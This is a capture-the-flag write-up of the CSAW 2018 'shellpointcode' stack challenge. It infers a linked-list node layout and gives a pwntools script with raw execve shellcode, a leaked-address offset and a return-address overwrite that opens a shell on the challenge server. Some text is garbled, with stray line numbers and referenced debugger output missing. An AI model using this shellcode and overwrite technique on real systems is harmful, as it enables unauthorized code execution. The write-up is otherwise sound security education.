[CSAW CTF Quals 2018] Shellcode Write-up (Pwn100)

Linked lists are great! They let you chain pieces of data together.

nc pwn.chal.csaw.io 9005

shellpointcode

Let’s check the file information first.

1
2
$ file shellpointcode
shellpointcode: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=214cfc4f959e86fe8500f593e60ff2a33b3057ee, not stripped

We notice that the second node’s address does not point to its buffer directly. Also, we see that our first node’s buffer is located at 0x7fffffffe0e8 which is 0x28 bytes further then the first node’s address. And, just above it, we have second node’s address. Therefore, we can guess the structure of node as:

1

3

struct Node {
    Node *next;
    char buffer[16];
}

Now, we now that we can modify the return address thanks to this fgets call, and we also know the first node’s buffer address since we have a known address from the stack which allows us to calculate other addresses from the stack using offsets. We can place a shellcode on the first node’s buffer. However, the buffer is too short. 15 bytes is not enough for us to write a 64-bit shellcode. However, instead of trying to write /bin/sh string to the stack in the shellcode, we can just place that string in the second node’s buffer. Then, we can just pop it into rdi. We also need to set rax to 59 and we need to make sure that rdx and rsi are 0. Let’s write the shellcode and calculate how many bytes it requires.

#!/usr/bin/env python
from pwn import *
p = '\x48\x31\xc0\x50\x5e\x99\x5f\x48\x89\xe7\xb0\x3b\x0f\x05'
 
r = remote('pwn.chal.csaw.io', 9005)
 
r.recvlines(4)
r.sendline(p)
r.recvline()
r.sendline('/bin/sh' + '\x00')
r.recvuntil('node.next: ')
leak = int(r.recvline(False), 16)
buf = leak + 0x28
r.recvlines(3)
r.sendline('A' * 11 + p64(buf))
r.recvline()
r.interactive()
